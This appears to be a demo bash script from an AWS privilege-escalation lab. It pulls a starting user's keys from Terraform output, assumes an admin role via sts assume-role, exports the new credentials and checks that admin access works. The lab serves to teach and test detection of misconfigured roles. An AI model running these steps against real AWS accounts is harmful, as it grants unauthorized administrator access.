#!/bin/bash

# Demo script for sts:AssumeRole privilege escalation
# This is a USER-BASED one-hop scenario


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-sts-001-to-admin-starting-user"
ADMIN_ROLE="pl-prod-sts-001-to-admin-target-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}STS AssumeRole Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}User-Based One-Hop to Admin${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(OTEL_TRACES_EXPORTER= terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_sts_001_sts_assumerole.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and ARNs
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
ADMIN_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_name')

if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Step 2: Verify identity as starting user
echo -e "${YELLOW}Step 2: Verifying identity${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as expected user${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"

# Step 3: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 3: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have list-users permission already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
fi
echo ""

# Step 4: Assume the admin role directly
echo -e "${YELLOW}Step 4: Assuming admin role via sts:AssumeRole${NC}"
echo "Role ARN: $ADMIN_ROLE_ARN"

show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$ADMIN_ROLE_ARN\" --role-session-name \"sts-001-demo-session\""
ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
    --role-arn "$ADMIN_ROLE_ARN" \
    --role-session-name "sts-001-demo-session")

# Update credentials to use assumed role
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed role $ADMIN_ROLE_NAME${NC}\n"

# Step 5: Verify admin identity
echo -e "${YELLOW}Step 5: Verifying new identity${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $NEW_IDENTITY"

if [[ ! $NEW_IDENTITY == *"$ADMIN_ROLE_NAME"* ]]; then
    echo -e "${RED}Error: Did not assume expected role${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified identity as $ADMIN_ROLE_NAME${NC}\n"

# Step 6: Verify we now have admin permissions
echo -e "${YELLOW}Step 6: Verifying admin permissions${NC}"
echo "Attempting to list IAM users..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 > /dev/null; then
    echo -e "${GREEN}✓ Success! Can now list IAM users${NC}"
else
    echo -e "${RED}⚠ Unexpected: Cannot list IAM users${NC}"
    exit 1
fi
echo ""

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Used ${YELLOW}sts:AssumeRole${NC} to directly assume admin role"
echo -e "Result: ${GREEN}Administrator Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $ADMIN_ROLE_NAME → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo ""
echo -e "${GREEN}Privilege escalation successful!${NC}"
echo -e "${YELLOW}This scenario demonstrates direct role assumption for privilege escalation.${NC}"
echo -e "${YELLOW}No cleanup needed - this attack makes no persistent changes.${NC}\n"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
